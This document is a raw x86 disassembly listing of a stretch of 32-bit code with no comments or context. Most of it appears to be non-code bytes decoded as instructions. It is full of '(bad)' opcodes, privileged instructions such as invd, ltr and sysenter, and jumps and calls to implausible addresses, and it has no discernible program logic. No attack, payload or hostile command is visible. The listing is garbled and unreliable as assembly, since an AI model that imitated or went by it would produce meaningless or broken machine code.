  402fdd:	mov    DWORD PTR [edi-0x31bff9f4],esi
  402fe3:	test   ebx,ecx
  402fe5:	cmovne ecx,DWORD PTR [edi-0x38f0ffc5]
  402fec:	test   al,0xd4
  402fee:	add    BYTE PTR [ebp+0x45fcf88b],al
  402ff4:	into   
  402ff5:	xor    ecx,ebx
  402ff7:	add    ecx,DWORD PTR [ebp-0x77]
  402ffa:	mov    edx,esp
  402ffc:	fadd   QWORD PTR [ebp-0x49]
  402fff:	mov    eax,DWORD PTR [esi]
  403001:	nop
  403002:	into   
  403003:	add    cl,dl
  403005:	mov    edx,ebx
  403007:	mov    edx,DWORD PTR [ebp+0x3c]
  40300a:	invd   
  40300c:	mov    BYTE PTR [ebp+0x0],al
  40300f:	mov    ecx,DWORD PTR [ebx-0x3dffe774]
  403015:	mov    ecx,DWORD PTR [ecx+0x3e41889]
  40301b:	push   ebp
  40301c:	push   ebp
  40301d:	cmp    ecx,DWORD PTR [ebx+0x488b3875]
  403023:	fmul   DWORD PTR [ecx+0x28dd000]
  403029:	call   0xf847bbef
  40302e:	rcl    esi,1
  403030:	rcl    ebx,0x45
  403033:	call   DWORD PTR [eax+0x50]
  403036:	inc    edx
  403037:	jne    0x40303c
  403039:	jmp    DWORD PTR [eax]
  40303b:	sbb    al,0xe8
  40303d:	dec    ebp
  40303e:	or     BYTE PTR [ebx+0x49555400],cl
  403044:	mov    ebp,DWORD PTR [ebx]
  403046:	sbb    BYTE PTR [ebx],al
  403048:	dec    eax
  403049:	and    BYTE PTR [ebx],dh
  40304b:	push   eax
  40304c:	add    edi,DWORD PTR [ebx]
  40304e:	cmp    eax,DWORD PTR [eax]
  403050:	je     0x402fdd
  403052:	push   ecx
  403053:	and    BYTE PTR [ebp-0x79],cl
  403056:	add    eax,DWORD PTR [ecx]
  403058:	or     al,0x0
  40305a:	inc    eax
  40305b:	adc    BYTE PTR [ebx],al
  40305d:	inc    ebp
  40305e:	and    bh,bh
  403060:	push   eax
  403061:	push   esp
  403062:	sub    DWORD PTR [ebp+0x0],esi
  403065:	push   edx
  403066:	mov    ecx,eax
  403068:	sbb    BYTE PTR [eax],al
  40306a:	dec    ebp
  40306b:	mov    ecx,DWORD PTR [ebx-0x3fbe1fe0]
  403071:	add    esi,DWORD PTR [ebx]
  403073:	jge    0x72cd3ac1
  403079:	add    DWORD PTR [eax],eax
  40307b:	mov    DWORD PTR [ebp+0x18],edx
  40307e:	mov    DWORD PTR [ebp+0x18],ecx
  403081:	cmovne edx,DWORD PTR [eax+0xf]
  403085:	xor    edx,DWORD PTR [edx+0x3]
  403088:	xor    ecx,DWORD PTR [ecx-0x2e74f3d5]
  40308e:	or     al,0x84
  403090:	rol    DWORD PTR [eax],cl
  403092:	dec    ebp
  403093:	add    BYTE PTR [ebx],bh
  403095:	dec    ebp
  403096:	jbe    0x4030cb
  403098:	mov    eax,DWORD PTR [ebx]
  40309a:	cld    
  40309b:	mov    DWORD PTR [edi+0x4d01e0],edx
  4030a1:	bswap  esi
  4030a3:	push   eax
  4030a4:	retf   
  4030a5:	xor    ecx,DWORD PTR [ebp+0x2b]
  4030a8:	mov    ebp,DWORD PTR [ebx]
  4030aa:	and    BYTE PTR [ecx],bh
  4030ac:	or     ah,al
  4030ae:	daa    
  4030af:	xchg   DWORD PTR [edi+0x100],eax
  4030b5:	push   ebp
  4030b6:	push   ebp
  4030b7:	adc    DWORD PTR [edx+0x8],0x55
  4030bb:	push   ebp
  4030bc:	xor    ebp,ebx
  4030be:	add    ecx,DWORD PTR [ebx+0x40551852]
  4030c4:	dec    DWORD PTR [ebp+0x45ffff54]
  4030ca:	sbb    al,0x8b
  4030cc:	rol    BYTE PTR [ebp-0x8fe8b7c],0x0
  4030d3:	and    eax,DWORD PTR [ebp+0x3]
  4030d6:	mov    edx,eax
  4030d8:	enter  0x8b,0x4
  4030dc:	mov    eax,DWORD PTR [ebp+0x33]
  4030df:	push   eax
  4030e0:	add    esp,DWORD PTR [edi-0x74f5fff1]
  4030e6:	add    ah,bh
  4030e8:	add    DWORD PTR [ebp-0x28],0xffffff8b
  4030ec:	mov    eax,0xd64f08
  4030f1:	ror    DWORD PTR [ecx-0x3fe83b36],cl
  4030f7:	mov    esp,DWORD PTR [esi+0x8]
  4030fa:	inc    ebp
  4030fb:	dec    eax
  4030fc:	mov    eax,0x44f8b
  403101:	inc    ebp
  403102:	mov    DWORD PTR [ecx-0x38],edx
  403105:	call   0xc338ca
  40310a:	or     BYTE PTR [ebp-0x75],al
  40310d:	mov    esp,DWORD PTR [esi-0x24]
  403110:	inc    ebp
  403111:	push   ebp
  403112:	mov    eax,0x284e83
  403117:	into   
  403118:	mov    DWORD PTR [edx+ecx*8-0x31cd7661],ecx
  40311f:	mov    eax,DWORD PTR [ebp+0xc]
  403122:	lea    eax,[ebp+0x45]
  403125:	mov    edi,DWORD PTR [ecx+0xb78adc]
  40312b:	push   es
  40312c:	xor    eax,esi
  40312e:	mov    edx,0x453bd0
  403133:	sub    eax,DWORD PTR [ebx]
  403135:	mov    edi,edi
  403137:	loopne 0x403141
  403139:	retf   0x837d
  40313c:	push   es
  40313d:	dec    ebp
  40313e:	mov    DWORD PTR [ebx+0xc78c72],ecx
  403144:	lods   al,BYTE PTR ds:[esi]
  403145:	xor    edx,edx
  403147:	add    esi,DWORD PTR [eax]
  403149:	mov    DWORD PTR [ebp+0x18],eax
  40314c:	xlat   BYTE PTR ds:[ebx]
  40314d:	dec    ebp
  40314e:	sar    BYTE PTR [ebx],cl
  403150:	(bad)  
  403151:	jne    0x403107
  403153:	mov    esp,edx
  403155:	fsub   st,st(7)
  403157:	add    BYTE PTR [ebp-0x73],al
  40315a:	xor    al,ch
  40315c:	in     al,dx
  40315d:	mov    eax,edi
  40315f:	hlt    
  403160:	mov    esp,0xd3d3d2d6
  403165:	mov    eax,edi
  403167:	in     al,0xc0
  403169:	jb     0x403158
  40316b:	push   ecx
  40316c:	inc    ebp
  40316d:	push   eax
  40316e:	jle    0x4030f5
  403170:	leave  
  403171:	cmove  esi,esp
  403174:	lods   al,BYTE PTR ds:[esi]
  403175:	add    BYTE PTR [eax],dl
  403177:	mov    esi,edx
  403179:	or     al,0x80
  40317b:	(bad)  
  40317c:	xor    al,0x1
  40317e:	mov    BYTE PTR [eax],al
  403180:	or     DWORD PTR [ecx],0x17
  403183:	into   
  403184:	in     al,dx
  403185:	retf   
  403186:	xchg   DWORD PTR [ecx+eax*1+0x4d000001],eax
  40318d:	gs push ecx
  40318f:	add    BYTE PTR [eax+0x27],dl
  403192:	mov    eax,DWORD PTR [eax]
  403194:	fsub   DWORD PTR [esi+0x0]
  403197:	inc    ebp
  403198:	lea    eax,[ebx-0x76affd54]
  40319e:	push   ecx
  40319f:	(bad)  
  4031a0:	lea    ebx,[ecx]
  4031a2:	fadd   DWORD PTR [eax]
  4031a4:	mov    esp,DWORD PTR [esi-0x74]
  4031a7:	inc    ebp
  4031a8:	add    BYTE PTR [ebx+0x65ff08ff],al
  4031ae:	mov    eax,DWORD PTR [eax]
  4031b0:	fmul   st,st(0)
  4031b2:	ror    BYTE PTR [ecx-0x4aba33c6],0xeb
  4031b9:	add    BYTE PTR [ebx-0x27b2769a],cl
  4031bf:	inc    bp
  4031c1:	inc    ebp
  4031c2:	je     0x40314f
  4031c4:	mov    ecx,DWORD PTR [eax]
  4031c6:	sbb    BYTE PTR [edi+ecx*4-0x3c],al
  4031ca:	add    DWORD PTR [ebx+0x0],eax
  4031cd:	add    BYTE PTR [ecx],dl
  4031cf:	jmpw   0x81db
  4031d3:	or     cl,BYTE PTR [ebx+0x668c00]
  4031d9:	retf   0x453b
  4031dc:	jne    0x403161
  4031de:	mov    ecx,DWORD PTR [eax]
  4031e0:	in     al,0x66
  4031e2:	(bad)
  4031e6:	add    BYTE PTR [ebp+0x52],al
  4031e9:	retf   0xec03
  4031ec:	mov    edi,eax
  4031ee:	sbb    al,0xb0
  4031f0:	inc    ebp
  4031f1:	call   0x463f654d
  4031f6:	and    al,ch
  4031f8:	and    ah,ch
  4031fa:	inc    edi
  4031fc:	test   DWORD PTR [eax+0x3fc3e90f],edi
  403202:	add    BYTE PTR [ebp-0x1],al
  403205:	ror    BYTE PTR [esp+ebp*8],cl
  403208:	(bad)  
  403209:	data16 jne 0x403251
  40320c:	call   0x729fe
  403211:	ret    0x33c0
  403214:	test   BYTE PTR [ebp-0x75fff300],cl
  40321a:	inc    ebp
  40321b:	or     BYTE PTR [ebx-0x3015dfb6],0x41
  403222:	sub    BYTE PTR [eax],dl
  403224:	(bad)  
  403225:	stc    
  403226:	test   DWORD PTR [edx+0xf],esi
  403229:	mov    ebx,DWORD PTR [ecx+0x570000d8]
  40322f:	lea    esi,[ebp-0x3c]
  403232:	call   0xff452d36
  403237:	pop    eax
  403239:	add    DWORD PTR [eax+eax*1+0x52005500],eax
  403240:	xchg   edi,edi
  403242:	add    DWORD PTR [eax],ecx
  403244:	add    BYTE PTR [ebp+0x55],cl
  403247:	push   ecx
  403248:	cmp    ecx,DWORD PTR [edi+0x8b0175]
  40324e:	fdiv   DWORD PTR [ecx]
  403250:	add    al,dl
  403252:	lea    eax,[ebp-0x18]
  403255:	test   edi,edi
  403257:	je     0x403241
  403259:	mov    DWORD PTR [ebp+0x8],ecx
  40325c:	dec    DWORD PTR [edx]
  40325e:	push   esp
  40325f:	add    bh,bh
  403261:	inc    ebp
  403262:	sbb    al,0x3b
  403264:	push   ebp
  403265:	or     BYTE PTR [ebx+0x50c80d],cl
  40326b:	mov    ecx,DWORD PTR [ebx+0x300338c]
  403271:	cmp    esi,DWORD PTR [ebp+esi*2-0x75]
  403275:	mov    ecx,DWORD PTR [eax+ebx*1]
  403278:	inc    ecx
  403279:	pop    edi
  40327b:	add    DWORD PTR [eax],ecx
  40327d:	add    BYTE PTR [ebp+0x7511f811],ah
  403283:	push   ebp
  403284:	dec    DWORD PTR [ebx+0xf69014]
  40328a:	or     BYTE PTR [ebx+0x11752800],cl
  403290:	adc    DWORD PTR [eax-0x61],0x660c008b
  403297:	push   eax
  403298:	jno    0x40330f
  40329a:	add    ebp,eax
  40329c:	push   edx
  40329d:	clc    
  40329e:	sar    bh,1
  4032a0:	xchg   eax,eax
  4032a2:	add    DWORD PTR [eax+eax*1-0x7ff7b00],eax
  4032a9:	jne    0x4032b5
  4032ab:	mov    eax,DWORD PTR [ebp-0x1]
  4032ae:	mov    esp,DWORD PTR [eax]
  4032b0:	sub    BYTE PTR [edx+eax*8-0x1],ah
  4032b4:	rol    BYTE PTR [ebp-0x5174f0bb],1
  4032ba:	loopne 0x4032bc
  4032bc:	dec    ebp
  4032bd:	mov    ecx,DWORD PTR [ecx+0x1855c70c]
  4032c3:	mov    eax,DWORD PTR [eax]
  4032c5:	call   0xffbe28ca
  4032ca:	add    al,al
  4032cc:	add    al,0x84
  4032ce:	add    BYTE PTR gs:[eax],al
  4032d1:	add    BYTE PTR [ebp-0x1],al
  4032d4:	jmp    0x4032f6
  4032d6:	xor    ecx,eax
  4032d8:	pop    edi
  4032d9:	call   FWORD PTR [ebx-0x7b]
  4032dc:	ret    0xf
  4032df:	mov    BYTE PTR [ebx+0x518b0f00],cl
  4032e5:	mov    WORD PTR [edi],cs
  4032e7:	add    BYTE PTR [ecx-0x75],al
  4032ea:	push   ebx
  4032eb:	and    BYTE PTR [ebx],dh
  4032ed:	adc    BYTE PTR [ebp-0x7a78f7e6],cl
  4032f3:	add    DWORD PTR [eax+eax*1-0x75],esi
  4032f7:	dec    ebp
  4032f8:	or     al,0x51
  4032fa:	sbb    al,0x75
  4032fc:	cmp    DWORD PTR [ebx+0x710ce408],ecx
  403302:	pop    eax
  403303:	push   edx
  403304:	add    edx,DWORD PTR [eax+0x3]
  403307:	mov    edi,DWORD PTR [ecx]
  403309:	and    BYTE PTR [eax],cl
  40330b:	xchg   DWORD PTR [edx],ecx
  40330d:	add    eax,eax
  40330f:	add    BYTE PTR [edi+0x0],al
  403312:	cli    
  403313:	(bad)  
  403314:	loope  0x4032d9
  403316:	shl    BYTE PTR [edi],0x5b
  403319:	dec    ebp
  40331a:	ret    0x8b
  40331d:	sub    BYTE PTR [ebx+0x28388345],cl
  403323:	pushf  
  403324:	inc    ebp
  403325:	mov    edi,DWORD PTR [eax]
  403327:	or     BYTE PTR [ebp+esi*2+0x59e481c7],bl
  40332e:	test   DWORD PTR [eax],eax
  403330:	clc    
  403331:	inc    DWORD PTR [ebp+0x10]
  403334:	cmp    al,dh
  403336:	pushf  
  403337:	jb     0x4032f1
  403339:	add    BYTE PTR [edi+0x9],cl
  40333c:	add    BYTE PTR [esi],dl
  40333e:	mov    edx,eax
  403340:	hlt    
  403341:	inc    eax
  403343:	(bad)  
  403344:	data16 rol BYTE PTR [ebp+0x0],1
  403348:	mov    eax,0x9c4f3b
  40334d:	jmp    0x4032d8
  40334f:	mov    edi,eax
  403351:	or     al,0xc0
  403353:	inc    eax
  403354:	add    ax,WORD PTR [ebp-0x1]
  403358:	mov    ecx,DWORD PTR [ecx+0x4545e008]
  40335e:	mov    ecx,DWORD PTR [ebx+0x1451c0c]
  403364:	mov    eax,DWORD PTR [ebp-0x10]
  403367:	add    DWORD PTR [ecx+0x7830800],edi
  40336d:	sbb    cl,al
  40336f:	jne    0x4032fc
  403371:	sub    esp,0x20
  403374:	lahf   
  403375:	mov    esi,DWORD PTR [edx]
  403377:	and    BYTE PTR [ebx],al
  403379:	add    dl,BYTE PTR [edi-0x40]
  40337c:	lock pop esi
  40337e:	test   cl,cl
  403380:	add    DWORD PTR [eax+eax*1],ebx
  403383:	push   ebp
  403384:	inc    ebp
  403385:	in     al,dx
  403386:	mov    esi,DWORD PTR [edi-0x483ef918]
  40338c:	ret    0xf014
  40338f:	push   edi
  403390:	test   bh,bh
  403392:	add    DWORD PTR [eax+eax*1+0x18],eax
  403396:	inc    ebp
  403397:	shl    BYTE PTR [ebx],cl
  403399:	pop    ds
  40339a:	add    ecx,DWORD PTR [eax-0x77]
  40339d:	(bad)  
  40339e:	loopne 0x4033d1
  4033a0:	inc    ebp
  4033a1:	pop    ebp
  4033a2:	xor    esi,DWORD PTR [edx+0x3]
  4033a5:	mov    ecx,DWORD PTR [ecx-0x482623f8]
  4033ab:	fdivp  st(4),st
  4033ad:	pop    ebp
  4033ae:	mov    bh,0x72
  4033b0:	hlt    
  4033b1:	add    DWORD PTR [ebx+0x28],0x0
  4033b5:	cmp    esp,DWORD PTR [esi+0x72]
  4033b8:	lock xor eax,DWORD PTR [ebx+0x5f]
  4033bc:	add    BYTE PTR [ebp+0x66],bl
  4033bf:	add    al,0xfb
  4033c1:	push   ebp
  4033c2:	or     ch,ah
  4033c4:	add    ah,ch
  4033c6:	data16 (bad) 
  4033c8:	lock lock add eax,DWORD PTR [ebp+0x4566f82b]
  4033d0:	jge    0x40340d
  4033d2:	mov    ebx,DWORD PTR [eax+eiz*8+0x66d87dc7]
  4033d9:	test   DWORD PTR [eax+edi*8],esi
  4033dc:	data16 adc al,0x75
  4033df:	add    BYTE PTR [ebx+0x7d45dc66],cl
  4033e5:	and    DWORD PTR [esi+0x60],0x34
  4033e9:	mov    DWORD PTR [esi-0x4],esp
  4033ec:	jne    0x403421
  4033ee:	mov    esi,0x667200
  4033f3:	inc    ebp
  4033f4:	or     BYTE PTR [ebx-0x76742000],al
  4033fa:	lock clc 
  4033fc:	mov    eax,DWORD PTR [ebp+0xc]
  4033ff:	mov    edi,esi
  403401:	in     al,dx
  403402:	or     BYTE PTR [ebp+0x0],al
  403405:	mov    esi,edi
  403407:	call   0x534f7947
  40340c:	sbb    bl,BYTE PTR [ecx+0x0]
  40340f:	push   ecx
  403410:	mov    esi,DWORD PTR [ebx]
  403412:	lock push esi
  403414:	pop    ebp
  403415:	jne    0x40344a
  403417:	mov    edx,0x3b7203
  40341c:	retw   0x3b7d
  403420:	minpd  xmm7,xmm0
  403424:	str    WORD PTR [ebp+0x66f0008b]
  40342b:	jne    0x40340c
  40342d:	xor    eax,DWORD PTR [ebx+eax*1+0xf003b00]
  403434:	mov    esp,esi
  403436:	cld    
  403437:	add    BYTE PTR [ebx-0x75],al
  40343a:	add    al,dh
  40343c:	sar    bx,0xc2
  403440:	mov    eax,DWORD PTR [ebp+0x8]
  403443:	mov    eax,DWORD PTR [ebx]
  403445:	lock rcr di,0xc2
  40344a:	es inc ebp
  40344c:	mov    ecx,DWORD PTR [edi]
  40344e:	clc    
  40344f:	jne    0x403494
  403451:	(bad)  
  403453:	jge    0x4034bb
  403455:	mov    eax,0x8b8afb
  40345a:	or     BYTE PTR [ebx],dh
  40345c:	add    edi,DWORD PTR [ebx+0xdf8a66]
  403462:	push   cs
  403463:	xor    esi,DWORD PTR [edi-0x48c4f748]
  403469:	add    ah,dh
  40346b:	add    edi,ebx
  40346d:	mov    ax,di
  403470:	or     dh,bh
  403472:	mov    ecx,DWORD PTR [ecx+0x7543f4fc]
  403478:	add    BYTE PTR [ebx-0x7404139a],cl
  40347e:	mov    esi,DWORD PTR [edi+0xc]
  403481:	mov    DWORD PTR [ebx],eax
  403483:	or     BYTE PTR [esi+0x75],ah
  403486:	fisttp WORD PTR [ebx-0x747417da]
  40348c:	clc    
  40348d:	ja     0x4034d2
  40348f:	mov    DWORD PTR [eax],eax
  403491:	or     al,0x66
  403493:	lahf   
  403494:	sti    
  403495:	add    BYTE PTR [ebx+0x3010ce9],cl
  40349b:	add    BYTE PTR [esi+0x7d],ah
  40349e:	fbld   TBYTE PTR [esi+0xe]
  4034a1:	pop    ebp
  4034a2:	mov    bh,0x81
  4034a4:	or     al,0x59
  4034a6:	mov    bh,0x0
  4034a8:	hlt    
  4034a9:	add    edi,ebx
  4034ab:	mov    di,bx
  4034ae:	or     al,0x84
  4034b0:	mov    eax,DWORD PTR [ecx]
  4034b2:	or     al,0x0
  4034b4:	mov    edi,DWORD PTR [ebp+0x8]
  4034b7:	mov    edi,DWORD PTR [ebx]
  4034b9:	adc    BYTE PTR [edi],cl
  4034bb:	stc    
  4034bc:	mov    ebx,0x8bdf00fa
  4034c1:	mov    ebx,eax
  4034c3:	or     al,0x5d
  4034c5:	mov    esi,DWORD PTR [ebx]
  4034c7:	or     BYTE PTR [ebp+0x72001f84],cl
  4034cd:	add    BYTE PTR [eax],al
  4034cf:	cmp    edi,DWORD PTR [ebp+0xf]
  4034d2:	mov    ecx,DWORD PTR [ebp+0x665d00d8]
  4034d8:	xor    edi,DWORD PTR [ebp-0x73]
  4034db:	mov    ebx,0x728a1f
  4034e0:	add    BYTE PTR [ebx],dh
  4034e2:	jge    0x40354a
  4034e4:	mov    ebx,DWORD PTR [ebp-0x20]
  4034e7:	pop    bp
  4034e9:	clc    
  4034ea:	cmp    di,WORD PTR [edx+esi*2]
  4034ee:	data16 data16 jge 0x40356f
  4034f2:	mov    edi,DWORD PTR [ebx+0x5d8adc]
  4034f8:	xor    di,WORD PTR [esi+eiz*2]
  4034fc:	pop    bp
  4034fe:	jge    0x403566
  403500:	mov    edi,eax
  403502:	lock cmp ecx,DWORD PTR [ebx-0x8f0f789]
  403509:	jge    0x403513
  40350b:	ltr    WORD PTR [ebp-0x2]
  40350f:	add    edi,DWORD PTR [ebx]
  403511:	hsubpd xmm4,xmm0
  403515:	data16 (bad) 
  403517:	jge    0x4034a4
  403519:	mov    ebx,0xf18ae4
  40351e:	dec    ebp
  40351f:	xor    eax,DWORD PTR [ebx]
  403521:	minpd  xmm6,xmm1
  403525:	data16 jne 0x403520
  403528:	jmp    0x403565
  40352a:	mov    esi,DWORD PTR [edx-0x10]
  40352d:	sar    WORD PTR [ebp+0x4d],1
  403531:	mov    ebx,0xa8a8d
  403536:	jb     0x40356b
  403538:	add    BYTE PTR [esi+0x4d],ah
  40353b:	pop    ebp
  40353c:	mov    esp,DWORD PTR [esi-0x20]
  40353f:	clc    
  403540:	jne    0x40357d
  403542:	data16 ja 0x403579
  403545:	jnp    0xf14f9bc8
  40354b:	pop    ebp
  40354c:	inc    ebx
  40354d:	add    eax,DWORD PTR [eax]
  40354f:	data16 data16 jge 0x403545
  403553:	data16 mov ch,0x7d
  403556:	add    BYTE PTR [esi+0x66],ah
  403559:	pop    ebp
  40355a:	icebp  
  40355b:	sbb    di,bx
  40355e:	jne    0x4034e5
  403560:	mov    eax,DWORD PTR [eax]
  403562:	call   0x77bdc067
  403567:	mov    ebp,DWORD PTR [ebx]
  403569:	in     al,dx
  40356a:	data16 stc 
  40356c:	repnz mov esp,0x32759f3b
  403572:	xor    ecx,DWORD PTR [ecx+0x7d33eceb]
  403578:	inc    eax
  403579:	mov    eax,DWORD PTR [edi]
  40357b:	call   0xbc742ec5
  403580:	add    ebx,DWORD PTR [edi-0x76a4cda1]
  403586:	ret    0xe8
  403589:	jge    0x403516
  40358b:	mov    edx,DWORD PTR [ecx-0x14]
  40358e:	mov    ecx,DWORD PTR [ebx-0x76f584aa]
  403594:	add    BYTE PTR [eax],cl
  403596:	data16 jge 0x403567
  403599:	mov    eax,DWORD PTR [ebx-0x18]
  40359c:	add    BYTE PTR [ebx-0x7631849a],cl
  4035a2:	mov    ch,0xc
  4035a4:	add    BYTE PTR [ebp-0x39],bh
  4035a7:	data16 cld 
  4035a9:	pop    ebp
  4035aa:	test   DWORD PTR [ecx+0x3859f8],eax
  4035b0:	pushf  
  4035b1:	add    esp,DWORD PTR [esi+0x66]
  4035b4:	into   
  4035b5:	fistp  WORD PTR [ebp-0x7b]
  4035b8:	push   edi
  4035b9:	(bad)  
  4035ba:	mov    bh,0xff
  4035bc:	mov    edi,0xff338d75
  4035c1:	mov    ebx,DWORD PTR [ecx-0x10]
  4035c4:	push   ecx
  4035c5:	repnz mov ebx,0x894faf
  4035cb:	lock cmp edx,DWORD PTR [edx]
  4035ce:	jne    0x403625
  4035d0:	mov    DWORD PTR [ebx],esi
  4035d2:	cld    
  4035d3:	mov    edx,DWORD PTR [edi-0x1c]
  4035d6:	xor    ecx,DWORD PTR [ebx+ecx*4+0x6632339f]
  4035dd:	mov    DWORD PTR [esp+eiz*8-0x749baac2],ecx
  4035e4:	mov    ebx,0x8b3bec
  4035e9:	push   esi
  4035ea:	sub    ecx,eax
  4035ec:	mov    ebx,0xba8a2b
  4035f1:	mov    dh,BYTE PTR [ebx]
  4035f3:	add    BYTE PTR [ebx+0xb94e33],bh
  4035f9:	dec    esi
  4035fa:	cmp    eax,DWORD PTR [eax]
  4035fc:	jne    0x403639
  4035fe:	mov    esi,DWORD PTR [ebp-0x4]
  403601:	mov    ebx,DWORD PTR [ebx-0x24]
  403604:	stc    
  403605:	jge    0x40358c
  403607:	data16 clc 
  403609:	xor    al,0x9
  40360b:	data16 into 
  40360d:	lock test BYTE PTR [ebx],dh
  403610:	inc    eax
  403611:	data16 fs icebp 
  403614:	pop    esi
  403615:	add    al,0xc3
  403617:	ror    BYTE PTR [ebx+0x57c0510c],0xeb
  40361e:	inc    ebp
  40361f:	mov    edi,DWORD PTR [ecx]
  403621:	in     al,0x9c
  403623:	sar    DWORD PTR [esi-0x7a17a3e],0xc9
  40362a:	pop    ebx
  40362b:	or     al,0xff
  40362d:	push   ebp
  40362e:	mov    ebp,esp
  403630:	mov    ah,BYTE PTR [esi+0x4]
  403633:	or     BYTE PTR [esi+edi*4],dh
  403636:	cmp    al,0x3b
  403638:	je     0x40363a
  40363a:	mov    ebp,DWORD PTR [ebx]
  40363c:	mov    edx,0xff8a8dbe
  403641:	add    BYTE PTR [ecx+0x33],bl
  403644:	push   ecx
  403645:	mov    esi,0x8b4e53
  40364a:	mov    ebx,0x393b45
  40364f:	pushf  
  403650:	sub    edi,DWORD PTR [edx-0x7757a45]
  403656:	add    BYTE PTR [ebx],bh
  403658:	xor    esi,DWORD PTR [ebx+edi*4+0x53]
  40365c:	dec    edi
  40365d:	str    ecx
  403660:	cmp    esp,DWORD PTR [ecx+0x75]
  403663:	int    0x89
  403665:	mov    esi,0x77208fc
  40366a:	xor    edx,DWORD PTR [ecx]
  40366c:	mov    eax,DWORD PTR [eax]
  40366e:	xor    esp,DWORD PTR [esi-0x73]
  403671:	retf   
  403672:	push   edi
  403673:	add    esp,ebp
  403675:	push   ebp
  403676:	add    BYTE PTR [ebp-0x293cfee8],cl
  40367c:	cmp    dl,0x4a
  40367f:	(bad)  
  403680:	sti    
  403681:	mov    esi,DWORD PTR [ebp+0x78]
  403684:	mov    esp,ebp
  403686:	cld    
  403687:	add    BYTE PTR ds:0xf800850a,bh
  40368d:	data16 or al,0xcb
  403690:	rol    DWORD PTR [ebx-0x37],0x0
  403694:	mov    DWORD PTR [esi+0x47],esp
  403697:	retf   
  403698:	in     eax,0xb5
  40369a:	add    BYTE PTR [eax],al
  40369c:	(bad)  
  40369d:	pop    si
  40369f:	retf   
  4036a0:	ret    
  4036a1:	enter  0x4d8b,0x51
  4036a5:	pop    edi
  4036a6:	mov    DWORD PTR [ecx-0x637ac604],0x333874f8
  4036b0:	pushf  
  4036b1:	(bad)  
  4036b2:	call   0x2634ff
  4036b7:	add    BYTE PTR [ebx+0x3b55bac9],cl
  4036bd:	in     al,dx
  4036be:	add    BYTE PTR [esi+0x2b],dl
  4036c1:	(bad)  
  4036c2:	mov    edx,0x858afc
  4036c7:	clc    
  4036c8:	xor    edi,DWORD PTR [eax]
  4036ca:	mov    edx,0xe84e9c
  4036cf:	(bad)  
  4036d0:	cmp    edi,edi
  4036d2:	je     0x4036cc
  4036d4:	push   ebx
  4036d5:	pop    es
  4036d6:	sysenter 
  4036d8:	leave  
  4036d9:	dec    edx
  4036da:	popa   
  4036db:	jle    0x4036aa
  4036dd:	popa   
  4036de:	mov    edi,0x76108c7
  4036e3:	int    0x67
  4036e5:	mov    ecx,0x7660800
  4036ea:	retf   
  4036eb:	add    ax,WORD PTR [eax]
  4036ee:	jne    0x4036fa
  4036f0:	lea    eax,[eax]
  4036f2:	add    DWORD PTR [esi-0x9],esp
  4036f5:	ret    
  4036f6:	(bad)  
  4036f7:	inc    ebx
  4036f8:	xlat   BYTE PTR ds:[ebx]
  4036f9:	add    BYTE PTR [ebx-0x1a3caf9a],cl
  4036ff:	add    BYTE PTR [bx+si],al
  403702:	or     ah,BYTE PTR [esi+0x0]
  403705:	ret    
  403706:	add    cx,bx
  403709:	jne    0x40374e
  40370b:	lea    eax,[eax]
  40370d:	add    DWORD PTR [esi-0xf],esp
  403710:	retf   
  403711:	(bad)  
  403712:	mov    ch,0xd1
  403714:	add    BYTE PTR [esi+eiz*2-0x379b34c2],al
  40371b:	mov    bh,BYTE PTR [ebp-0x80]
  40371e:	cmp    DWORD PTR [esp+ebx*4],esi
  403721:	repz pop edi
  403723:	xor    BYTE PTR [esi+edi*2+0x33],0xc3
  403728:	inc    eax
  403729:	inc    ebp
  40372a:	add    bl,BYTE PTR [ebx-0x40]
  40372d:	cmp    ecx,ecx
  40372f:	pushf  
  403730:	push   ebp
  403731:	je     0x40371f
  403733:	xor    ecx,DWORD PTR [ebx-0x4899f7cd]
  403739:	mov    WORD PTR [esi+0x3e],ss
  40373c:	and    DWORD PTR [esp+eax*8-0x75],0xc9435fff
  403744:	add    BYTE PTR [ebp+0x57],dl
  403747:	in     al,dx
  403748:	(bad)  
  403749:	push   esi
  40374a:	mov    ch,0x45
  40374c:	add    BYTE PTR [ecx],bh
  40374e:	mov    DWORD PTR [esp+edi*8+0x74853bbe],ebx
  403755:	clc    
  403756:	mov    edx,edx
  403758:	or     bh,bh
  40375a:	ret    0x4566
  40375d:	or     bl,ch
  40375f:	or     cl,BYTE PTR [ebx-0x7699f800]
  403765:	retf   0x4383
  403768:	add    al,BYTE PTR [eax]
  40376a:	mov    bh,0x66
  40376c:	adc    dl,cl
  40376e:	iret   
  40376f:	mov    ch,0xc7
  403771:	add    ah,al
  403773:	dec    dx
  403776:	(bad)  
  403777:	push   edi
  403778:	mov    ch,0x57
  40377a:	add    BYTE PTR [edi-0x7207459a],dh
  403780:	(bad)  
  403782:	rcr    BYTE PTR [ecx+0x66],0x51
  403786:	add    bh,BYTE PTR [ebx+0x5e4f45]
  40378c:	ret    0x3b
  40378f:	jne    0x40371c
  403791:	mov    DWORD PTR [ebx+0x457218fc],eax
  403797:	xor    edi,DWORD PTR [eax]
  403799:	mov    ebx,DWORD PTR [ebx+esi*1-0x73179939]
  4037a0:	test   DWORD PTR [esi],edi
  4037a2:	clc    
  4037a3:	fs inc ebp
  4037a5:	mov    ebx,0x83b35
  4037aa:	pop    es
  4037ab:	sub    ebx,DWORD PTR [edi-0x7675cd45]
  4037b1:	add    al,bh
  4037b3:	xor    eax,DWORD PTR [ebp-0x45]
  4037b6:	xor    BYTE PTR [esi-0x64],cl
  4037b9:	add    bh,al
  4037bb:	cmp    esi,esp
  4037bd:	jne    0x403744
  4037bf:	cmp    eax,0x3a8545fc
  4037c5:	clc    
  4037c6:	pushf  
  4037c7:	pop    ebx
  4037c8:	mov    eax,DWORD PTR ds:0xeb59c0ec
  4037ce:	push   ecx
  4037cf:	xor    ecx,DWORD PTR [ebx-0x7b3c07a2]
  4037d5:	mov    ebx,DWORD PTR [edi-0x74bacdaf]
  4037db:	psubsb mm1,QWORD PTR [eax]
  4037de:	icebp  
  4037df:	lea    ecx,[eax]
  4037e1:	test   BYTE PTR [edi],0xff
  4037e4:	sar    DWORD PTR [esi+0x8a72],0x55
  4037eb:	xor    ecx,DWORD PTR [edi]
  4037ed:	mov    edi,0xc24ed1
  4037f2:	adc    DWORD PTR [ebp+0x0],0x66
  4037f6:	add    bh,al
  4037f8:	inc    ebp
  4037f9:	sub    ecx,DWORD PTR [ebx-0x3ed407bb]
  4037ff:	mov    DWORD PTR [ebp+0x8],ecx
  403802:	add    DWORD PTR [ebx],0x66514559
